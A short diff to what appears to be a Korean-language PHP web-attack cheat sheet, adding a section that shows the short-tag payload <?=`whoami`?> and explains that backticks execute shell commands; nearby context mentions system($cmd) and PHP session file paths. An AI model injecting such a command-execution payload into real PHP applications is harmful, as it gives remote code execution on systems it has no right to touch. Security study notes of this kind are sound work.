@@ -1300,6 +1300,13 @@ $output = system($cmd);
 c:\windows\temp\sess_<session>
 ```
 
+## <?=?>
+```php
+<?=`whoami`?>
+```
+- `<?=` : `<?php echo ?>`와 동일
+- ``code`` : PHP에서 백틱 내부의 코드는 셸 명령어로 실행됨.
+
 </details>
 
 ---
